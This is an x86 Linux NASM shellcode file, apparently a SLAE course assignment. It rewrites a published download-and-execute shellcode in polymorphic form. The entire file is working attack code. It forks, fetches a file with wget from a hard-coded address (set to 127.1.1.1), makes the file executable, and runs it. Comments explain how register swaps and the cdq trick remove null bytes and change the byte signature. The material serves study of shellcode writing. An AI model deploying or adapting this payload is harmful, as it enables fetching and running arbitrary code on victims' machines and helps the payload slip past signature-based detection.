; SLAE-970
; thanks to students previous writeups 
; assignment 6.3 : polymorphic version of shellstorm shellcode 
; originality : polymorphic version of downloachmod 

; original shellcode 
; Filename: downloadexec.nasm
; Author: Daniel Sauder

global _start

section .text

_start:

    ;fork
    xor eax,eax
    ; lets use the cdq trick for having another zero register
    ; cdq is one byte , xor eax eax is two bytes 
    cdq 
    mov al,0x2
    int 0x80
    ; we switch register here 
    ;xor ecx,ecx ; now we use edx instead of ecx, so useless 
    cmp eax,edx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod x
    ; useless xor we can remove it and decrease size
    ; xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    ; we switch register, ie replace eax by esi 
    xor esi, esi
    push esi
    push 0x78
    mov ebx, esp
    push esi
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download http://IP/x with wget
    push 0xb
    pop eax
    cdq ; cdq trick to have zero into edx  
    push edx
    
    ;push 0x782f2f31 ; we changed the IP for localhost 127.1.1.1 so no null byte 
    ; by removing some bytes and changing this address we decrease the size 
    push 0x782f2f31 ;22.2 ; x//1
    push 0x2e312e31 ;.861 ; .1.1
    push 0x2e373231 ;.721
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
    
; size is reduced by 3 bytes 
